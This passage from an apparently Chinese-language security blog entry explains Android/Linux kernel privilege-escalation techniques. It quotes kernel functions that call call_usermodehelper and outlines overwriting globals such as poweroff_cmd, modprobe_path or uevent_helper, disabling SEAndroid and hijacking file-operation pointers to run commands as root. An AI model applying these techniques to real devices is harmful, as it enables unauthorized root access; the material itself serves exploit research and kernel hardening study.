class="keyword">unsigned</span> <span class="keyword">long</span>, arg5)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">me</span> = <span class="title">current</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> comm[<span class="keyword">sizeof</span>(me-&gt;comm)];</span><br><span class="line"><span class="keyword">long</span> error;</span><br><span class="line"></span><br><span class="line">error = security_task_prctl(option, arg2, arg3, arg4, arg5);</span><br><span class="line"><span class="keyword">if</span> (error != -ENOSYS)</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line"></span><br><span class="line">error = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">switch</span> (option) &#123;</span><br><span class="line"><span class="keyword">case</span> PR_SET_PDEATHSIG:</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> error;</span><br></pre></td></tr></table></figure><h4 id="实现root"><a href="#实现root" class="headerlink" title="实现root"></a>实现root</h4><p>同理修改cap_task_prctl为call_usermodehelper函数地址,调用prctl函数<br>(security_task_prctl===&gt;cap_task_prctl)将会执行call_usermodehelper<br>从而在内核中执行用户指定的程序(security_task_prctl 5个参数都可控)</p><h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><p>由于prctl第一个参数是int是个32位当在64位系统环境会被截断</p><h3 id="间接调用call-usermodehelper实现root思路"><a href="#间接调用call-usermodehelper实现root思路" class="headerlink" title="间接调用call_usermodehelper实现root思路"></a>间接调用call_usermodehelper实现root思路</h3><p>如果security_ops结构很难被修改,需要找到一种更好的方法与覆盖的结构体无关且不会限制输入的参数<br>通过查找call_usermodehelper相关api的调用点,可以在内核中找到间接调用call_usermodehelper的几个有趣函数</p><p>通过查找call_usermodehelper调用点,存在下面几个潜在的点:修改全局变量poweroff_cmd、modprobe_path、<br>ocfs2_hb_ctl_path、nfs_cache_getent_prog、cltrack_prog、uevent_helper然后截获控制流到__orderly_poweroff、<br>call_modprobe(2版本内核没有)、ocfs2_leave_group、nfs_cache_upcall、nfsd4_umh_cltrack_upcall、<br>kobject_uevent_env(HotplugEater热插拔相关的)即可实现root</p><h4 id="1、通过poweroff-cmd执行call-usermodehelper"><a href="#1、通过poweroff-cmd执行call-usermodehelper" class="headerlink" title="1、通过poweroff_cmd执行call_usermodehelper"></a>1、通过poweroff_cmd执行call_usermodehelper</h4><p>如果修改了全局的poweroff_cmd,且截获控制流到__orderly_poweroff则可以执行任意命令</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v3.16.50/source/kernel/reboot.c#L308</span></span><br><span class="line">char poweroff_cmd[POWEROFF_CMD_PATH_LEN] = <span class="string">"/sbin/poweroff"</span>;</span><br><span class="line"></span><br><span class="line">static <span class="keyword">int</span> __orderly_poweroff(<span class="keyword">bool</span> force)</span><br><span class="line">&#123;</span><br><span class="line">char **argv;</span><br><span class="line">static char *envp[] = &#123;</span><br><span class="line"><span class="string">"HOME=/"</span>,</span><br><span class="line"><span class="string">"PATH=/sbin:/bin:/usr/sbin:/usr/bin"</span>,</span><br><span class="line">NULL</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">argv = argv_split(GFP_KERNEL, poweroff_cmd, NULL);</span><br><span class="line"><span class="keyword">if</span> (argv) &#123;</span><br><span class="line"><span class="comment">//执行/sbin/poweroff  任意命令执行</span></span><br><span class="line">ret = call_usermodehelper(argv[<span class="number">0</span>], argv, envp, UMH_WAIT_EXEC);</span><br><span class="line">argv_free(argv);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">ret = -ENOMEM;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ret &amp;&amp; force) &#123;</span><br><span class="line">pr_warn(<span class="string">"Failed to start orderly shutdown: forcing the issue\n"</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * I guess this should try to kick off some daemon to sync and</span></span><br><span class="line"><span class="comment"> * poweroff asap.  Or not even bother syncing if we're doing an</span></span><br><span class="line"><span class="comment"> * emergency shutdown?</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">emergency_sync();</span><br><span class="line">kernel_power_off();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2、通过modprobe-path执行call-usermodehelper"><a href="#2、通过modprobe-path执行call-usermodehelper" class="headerlink" title="2、通过modprobe_path执行call_usermodehelper"></a>2、通过modprobe_path执行call_usermodehelper</h4><p>如果修改了全局的modprobe_path且截获控制流到call_modprobe则可以执行任意命令</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v3.16.50/source/kernel/kmod.c#L70</span></span><br><span class="line"><span class="keyword">char</span> modprobe_path[KMOD_PATH_LEN] = <span class="string">"/sbin/modprobe"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//清理函数 释放回收内存</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">free_modprobe_argv</span><span class="params">(struct subprocess_info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">kfree(info-&gt;argv[<span class="number">3</span>]); <span class="comment">/* check call_modprobe() */</span></span><br><span class="line">kfree(info-&gt;argv);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">call_modprobe</span><span class="params">(<span class="keyword">char</span> *module_name, <span class="keyword">int</span> wait)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> *<span class="title">info</span>;</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *envp[] = &#123;</span><br><span class="line"><span class="string">"HOME=/"</span>,</span><br><span class="line"><span class="string">"TERM=linux"</span>,</span><br><span class="line"><span class="string">"PATH=/sbin:/usr/sbin:/bin:/usr/bin"</span>,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> **argv = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">char</span> *[<span class="number">5</span>]), GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!argv)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">module_name = kstrdup(module_name, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!module_name)</span><br><span class="line"><span class="keyword">goto</span> free_argv;</span><br><span class="line"></span><br><span class="line">argv[<span class="number">0</span>] = modprobe_path;</span><br><span class="line">argv[<span class="number">1</span>] = <span class="string">"-q"</span>;</span><br><span class="line">argv[<span class="number">2</span>] = <span class="string">"--"</span>;</span><br><span class="line">argv[<span class="number">3</span>] = module_name;<span class="comment">/* check free_modprobe_argv() */</span></span><br><span class="line">argv[<span class="number">4</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//执行modprobe_path  实现任意命令执行</span></span><br><span class="line">info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,</span><br><span class="line"> <span class="literal">NULL</span>, free_modprobe_argv, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (!info)</span><br><span class="line"><span class="keyword">goto</span> free_module_name;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> call_usermodehelper_exec(info, wait | UMH_KILLABLE);</span><br><span class="line"></span><br><span class="line">free_module_name:</span><br><span class="line">kfree(module_name);</span><br><span class="line">free_argv:</span><br><span class="line">kfree(argv);</span><br><span class="line">out:</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3、通过ocfs2-leave-group执行"><a href="#3、通过ocfs2-leave-group执行" class="headerlink" title="3、通过ocfs2_leave_group执行"></a>3、通过ocfs2_leave_group执行</h4><p>通过修改全局ocfs2_hb_ctl_path且截获控制流到ocfs2_leave_group从而执行任意命令</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v3.16.50/source/fs/ocfs2/stackglue.c#L432</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ocfs2_leave_group</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *group)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"><span class="keyword">char</span> *argv[<span class="number">5</span>], *envp[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">argv[<span class="number">0</span>] = ocfs2_hb_ctl_path;</span><br><span class="line">argv[<span class="number">1</span>] = <span class="string">"-K"</span>;</span><br><span class="line">argv[<span class="number">2</span>] = <span class="string">"-u"</span>;</span><br><span class="line">argv[<span class="number">3</span>] = (<span class="keyword">char</span> *)group;</span><br><span class="line">argv[<span class="number">4</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* minimal command environment taken from cpu_run_sbin_hotplug */</span></span><br><span class="line">envp[<span class="number">0</span>] = <span class="string">"HOME=/"</span>;</span><br><span class="line">envp[<span class="number">1</span>] = <span class="string">"PATH=/sbin:/bin:/usr/sbin:/usr/bin"</span>;</span><br><span class="line">envp[<span class="number">2</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//执行ocfs2_hb_ctl_path 实现任意命令执行</span></span><br><span class="line">ret = call_usermodehelper(argv[<span class="number">0</span>], argv, envp, UMH_WAIT_PROC);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">printk(KERN_ERR</span><br><span class="line">       <span class="string">"ocfs2: Error %d running user helper "</span></span><br><span class="line">       <span class="string">"\"%s %s %s %s\"\n"</span>,</span><br><span class="line">       ret, argv[<span class="number">0</span>], argv[<span class="number">1</span>], argv[<span class="number">2</span>], argv[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4、通过nfs-cache-upcall函数"><a href="#4、通过nfs-cache-upcall函数" class="headerlink" title="4、通过nfs_cache_upcall函数"></a>4、通过nfs_cache_upcall函数</h4><p>通过修改全局nfs_cache_getent_progq且截获控制流到nfs_cache_upcall达到任意代码执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v3.16.50/source/fs/nfs/cache_lib.c#L34</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">nfs_cache_upcall</span><span class="params">(struct cache_detail *cd, <span class="keyword">char</span> *entry_name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *envp[] = &#123; <span class="string">"HOME=/"</span>,</span><br><span class="line"><span class="string">"TERM=linux"</span>,</span><br><span class="line"><span class="string">"PATH=/sbin:/usr/sbin:/bin:/usr/bin"</span>,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">char</span> *argv[] = &#123;</span><br><span class="line">nfs_cache_getent_prog,</span><br><span class="line">cd-&gt;name,</span><br><span class="line">entry_name,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> ret = -EACCES;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nfs_cache_getent_prog[<span class="number">0</span>] == <span class="string">'\0'</span>)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"><span class="comment">//执行nfs_cache_getent_prog 实现任意代码执行</span></span><br><span class="line">ret = call_usermodehelper(argv[<span class="number">0</span>], argv, envp, UMH_WAIT_EXEC);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Disable the upcall mechanism if we're getting an ENOENT or</span></span><br><span class="line"><span class="comment"> * EACCES error. The admin can re-enable it on the fly by using</span></span><br><span class="line"><span class="comment"> * sysfs to set the 'cache_getent' parameter once the problem</span></span><br><span class="line"><span class="comment"> * has been fixed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (ret == -ENOENT || ret == -EACCES)</span><br><span class="line">nfs_cache_getent_prog[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">out:</span><br><span class="line"><span class="keyword">return</span> ret &gt; <span class="number">0</span> ? <span class="number">0</span> : ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="5、通过nfsd4-umh-cltrack-upcall函数"><a href="#5、通过nfsd4-umh-cltrack-upcall函数" class="headerlink" title="5、通过nfsd4_umh_cltrack_upcall函数"></a>5、通过nfsd4_umh_cltrack_upcall函数</h4><p>修改全局变量cltrack_prog且截获控制流到nfsd4_umh_cltrack_upcall实现任意代码执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v3.16.50/source/fs/nfsd/nfs4recover.c#L1129</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">nfsd4_umh_cltrack_upcall(<span class="keyword">char</span> *cmd, <span class="keyword">char</span> *arg, <span class="keyword">char</span> *legacy)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span> *envp[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">char</span> *argv[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!cltrack_prog[<span class="number">0</span>])) &#123;</span><br><span class="line">dprintk(<span class="string">"%s: cltrack_prog is disabled\n"</span>, __func__);</span><br><span class="line"><span class="keyword">return</span> -EACCES;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dprintk(<span class="string">"%s: cmd: %s\n"</span>, __func__, cmd);</span><br><span class="line">dprintk(<span class="string">"%s: arg: %s\n"</span>, __func__, arg ? arg : <span class="string">"(null)"</span>);</span><br><span class="line">dprintk(<span class="string">"%s: legacy: %s\n"</span>, __func__, legacy ? legacy : <span class="string">"(null)"</span>);</span><br><span class="line"></span><br><span class="line">envp[<span class="number">0</span>] = legacy;</span><br><span class="line">envp[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">argv[<span class="number">0</span>] = (<span class="keyword">char</span> *)cltrack_prog;</span><br><span class="line">argv[<span class="number">1</span>] = cmd;</span><br><span class="line">argv[<span class="number">2</span>] = arg;</span><br><span class="line">argv[<span class="number">3</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//执行cltrack_prog 实现任意代码执行</span></span><br><span class="line">ret = call_usermodehelper(argv[<span class="number">0</span>], argv, envp, UMH_WAIT_PROC);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Disable the upcall mechanism if we're getting an ENOENT or EACCES</span></span><br><span class="line"><span class="comment"> * error. The admin can re-enable it on the fly by using sysfs</span></span><br><span class="line"><span class="comment"> * once the problem has been fixed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (ret == -ENOENT || ret == -EACCES) &#123;</span><br><span class="line">dprintk(<span class="string">"NFSD: %s was not found or isn't executable (%d). "</span></span><br><span class="line"><span class="string">"Setting cltrack_prog to blank string!"</span>,</span><br><span class="line">cltrack_prog, ret);</span><br><span class="line">cltrack_prog[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">&#125;</span><br><span class="line">dprintk(<span class="string">"%s: %s return value: %d\n"</span>, __func__, cltrack_prog, ret);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="6、通过kobject-uevent-env函数——HotplugEater-热插拔相关"><a href="#6、通过kobject-uevent-env函数——HotplugEater-热插拔相关" class="headerlink" title="6、通过kobject_uevent_env函数——HotplugEater(热插拔相关)"></a>6、通过kobject_uevent_env函数——HotplugEater(热插拔相关)</h4><p>修改uevent_helper变量实现任意代码执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">通过修改uevent_helper实现任意代码执行</span><br><span class="line"></span><br><span class="line">uevent_helper定义</span><br><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v3.16.50/source/lib/kobject_uevent.c#L33</span></span><br><span class="line"><span class="keyword">char</span> uevent_helper[UEVENT_HELPER_PATH_LEN] = CONFIG_UEVENT_HELPER_PATH;</span><br><span class="line"></span><br><span class="line">初始化env为uevent_helper</span><br><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v3.16.50/source/lib/kobject_uevent.c#L130</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">init_uevent_argv</span><span class="params">(struct kobj_uevent_env *env, <span class="keyword">const</span> <span class="keyword">char</span> *subsystem)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> len;</span><br><span class="line"></span><br><span class="line">len = strlcpy(&amp;env-&gt;buf[env-&gt;buflen], subsystem,</span><br><span class="line">      <span class="keyword">sizeof</span>(env-&gt;buf) - env-&gt;buflen);</span><br><span class="line"><span class="keyword">if</span> (len &gt;= (<span class="keyword">sizeof</span>(env-&gt;buf) - env-&gt;buflen)) &#123;</span><br><span class="line">WARN(<span class="number">1</span>, KERN_ERR <span class="string">"init_uevent_argv: buffer size too small\n"</span>);</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//uevent_helper</span></span><br><span class="line">env-&gt;argv[<span class="number">0</span>] = uevent_helper;</span><br><span class="line">env-&gt;argv[<span class="number">1</span>] = &amp;env-&gt;buf[env-&gt;buflen];</span><br><span class="line">env-&gt;argv[<span class="number">2</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">env-&gt;buflen += len + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v3.16.50/source/lib/kobject_uevent.c#L165</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kobject_uevent_env</span><span class="params">(struct kobject *kobj, <span class="keyword">enum</span> kobject_action action,</span></span></span><br><span class="line"><span class="function"><span class="params">       <span class="keyword">char</span> *envp_ext[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_UEVENT_HELPER</span></span><br><span class="line"><span class="comment">/* call uevent_helper, usually only enabled during early boot */</span></span><br><span class="line"><span class="keyword">if</span> (uevent_helper[<span class="number">0</span>] &amp;&amp; !kobj_usermode_filter(kobj)) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> *<span class="title">info</span>;</span></span><br><span class="line"></span><br><span class="line">retval = add_uevent_var(env, <span class="string">"HOME=/"</span>);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line"><span class="keyword">goto</span> <span class="built_in">exit</span>;</span><br><span class="line">retval = add_uevent_var(env,</span><br><span class="line"><span class="string">"PATH=/sbin:/bin:/usr/sbin:/usr/bin"</span>);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line"><span class="keyword">goto</span> <span class="built_in">exit</span>;</span><br><span class="line"><span class="comment">//初始化env</span></span><br><span class="line">retval = init_uevent_argv(env, subsystem);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line"><span class="keyword">goto</span> <span class="built_in">exit</span>;</span><br><span class="line"></span><br><span class="line">retval = -ENOMEM;</span><br><span class="line"><span class="comment">//执行env-&gt;argv[0](init_uevent_argv中初始化)</span></span><br><span class="line">info = call_usermodehelper_setup(env-&gt;argv[<span class="number">0</span>], env-&gt;argv,</span><br><span class="line"> env-&gt;envp, GFP_KERNEL,</span><br><span class="line"> <span class="literal">NULL</span>, cleanup_uevent_env, env);</span><br><span class="line"><span class="keyword">if</span> (info) &#123;</span><br><span class="line">retval = call_usermodehelper_exec(info, UMH_NO_WAIT);</span><br><span class="line">env = <span class="literal">NULL</span>;<span class="comment">/* freed by cleanup_uevent_env */</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span>:</span><br><span class="line">kfree(devpath);</span><br><span class="line">kfree(env);</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>其中orderly_poweroff看起来相当不错,热插拔只要修改uevent_helper变量即可实现任意代码执行</p><p>利用思路如下(间接调用call_usermodehelper):<br>1、修改poweroff_cmd变量的值为你想要执行的命令<br>2、关闭SEAndroid(调用reset_security_ops函数,详细分析在上面)<br>3、修改FPT(File Struct operation pointer table)——文件相关操作的指针(ptmx等)为orderly_poweroff<br>3、trap FPT相关的函数调用,截获控制流实现任意代码执行</p><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="http://powerofcommunity.net/poc2016/x82.pdf" target="_blank" rel="noopener">New Reliable Android Kernel Root Exploitation Techniques</a></p></the>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;本文摘要——&quot;&gt;&lt;a href=&quot;#本文摘要——&quot; class=&quot;headerlink&quot; title=&quot; 本文摘要——   &quot;&gt;&lt;/a&gt;&lt;strong&gt; 本文摘要—— new_reliable_android_kernel_root_exploit &lt;/strong&gt; &lt;excerpt in=&quot;&quot; index=&quot;&quot; |=&quot;&quot; 首页摘要=&quot;&quot;&gt;&lt;/excerpt&gt;&lt;/h1&gt;
    
    </summary>
    
    
      <category term="linux" scheme="https://0x9k.club/tags/linux/"/>
    
      <category term="kernel" scheme="https://0x9k.club/tags/kernel/"/>
    
      <category term="exploit" scheme="https://0x9k.club/tags/exploit/"/>
    
  </entry>
  
</feed>
